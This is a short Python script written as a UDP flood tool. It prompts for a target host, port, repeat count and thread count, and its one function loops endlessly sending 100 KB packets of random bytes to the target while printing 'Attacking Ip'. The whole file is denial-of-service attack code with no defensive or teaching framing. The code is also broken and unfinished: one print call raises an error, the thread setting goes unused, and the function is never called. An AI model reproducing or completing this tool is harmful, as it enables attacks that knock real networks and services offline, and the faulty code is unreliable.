import random 
import time
import socket
import threading
import os , sys


ip = str(input("Host :"))
port = int(input("Port :"))
times = int(input(" Times :"))
threads = int(input(" Threading :"))
os.system("cls")
def udp():
	data = random._urandom(102400)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+" Attacking Ip %s And Port %s"%(ip,port))
		except:
			print(" Attacking Ip %s And Port %s"%(ip,port))
